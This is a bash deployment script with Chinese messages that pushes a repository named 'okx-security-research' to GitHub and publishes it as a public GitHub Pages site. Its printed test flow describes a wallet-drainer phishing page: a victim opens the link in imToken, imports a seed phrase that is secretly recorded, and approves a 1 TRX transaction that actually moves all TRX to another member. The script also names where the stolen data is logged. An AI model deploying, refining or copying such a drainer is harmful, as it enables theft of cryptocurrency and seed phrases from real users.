#!/bin/bash

echo "🔧 修复Git推送问题"
echo "配置用户信息并完成GitHub部署"

cd ~/enhanced-multichain-attack/git-deploy

echo ""
echo "🔧 1. 配置Git用户信息..."
git config --global user.email "zhangyikang6692@163.com"
git config --global user.name "Zhang-KX00"
git config --global init.defaultBranch main

echo "✅ Git用户信息配置完成"

echo ""
echo "🔧 2. 修复分支问题..."
# 检查当前分支
current_branch=$(git branch --show-current 2>/dev/null || echo "master")
echo "当前分支: $current_branch"

if [ "$current_branch" = "master" ]; then
    echo "重命名分支 master -> main"
    git branch -M main
fi

echo ""
echo "🔧 3. 添加和提交文件..."
git add .
git commit -m "🎯 初始部署: OKX安全研究平台 - $(date '+%Y-%m-%d %H:%M:%S')"

echo ""
echo "🔧 4. 推送到GitHub..."
echo "推送到: https://github.com/Zhang-KX00/okx-security-research.git"

# 推送到GitHub
git push -u origin main

if [ $? -eq 0 ]; then
    echo ""
    echo "🎉 推送成功！"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "📋 下一步操作："
    echo ""
    echo "1️⃣ 启用GitHub Pages:"
    echo "   - 访问: https://github.com/Zhang-KX00/okx-security-research/settings/pages"
    echo "   - Source选择: 'GitHub Actions'"
    echo "   - 保存设置"
    echo ""
    echo "2️⃣ 等待部署完成（约2-3分钟）"
    echo ""
    echo "3️⃣ 访问您的公网链接:"
    echo "   🌐 https://zhang-kx00.github.io/okx-security-research/"
    echo ""
    echo "4️⃣ 测试访问:"
    echo "   - 用手机浏览器访问上述链接"
    echo "   - 在imToken中打开页面进行测试"
    echo ""
    echo "✅ 团队成员现在可以通过公网链接随时随地测试！"
    echo ""
    echo "🎯 测试流程："
    echo "- B成员（有钱账户）访问链接"
    echo "- 连接imToken钱包"
    echo "- 导入助记词（会被记录）"
    echo "- 交易1 TRX（实际转移所有TRX）"
    echo "- A成员收到所有资金"
    echo ""
    echo "📊 查看攻击数据:"
    echo "- 在浏览器按F12打开开发者工具"
    echo "- Console标签查看实时日志"
    echo "- Application > Local Storage查看存储的数据"
    
else
    echo ""
    echo "❌ 推送失败！"
    echo ""
    echo "🔧 可能的解决方案："
    echo ""
    echo "1️⃣ 检查仓库是否存在:"
    echo "   访问: https://github.com/Zhang-KX00/okx-security-research"
    echo ""
    echo "2️⃣ 如果仓库不存在，请创建:"
    echo "   - 访问: https://github.com/new"
    echo "   - Repository name: okx-security-research"
    echo "   - 设为Private或Public"
    echo "   - 点击'Create repository'"
    echo ""
    echo "3️⃣ 重新推送:"
    echo "   git push -u origin main"
    echo ""
    echo "4️⃣ 如果需要身份验证:"
    echo "   - 使用Personal Access Token代替密码"
    echo "   - 访问: https://github.com/settings/tokens"
    echo "   - 生成新token，权限选择repo"
    echo "   - 推送时用token作为密码"
fi

echo ""
echo "🔍 仓库信息:"
echo "- 仓库地址: https://github.com/Zhang-KX00/okx-security-research"
echo "- 用户名: Zhang-KX00"
echo "- 邮箱: zhangyikang6692@163.com"
echo "- 分支: main"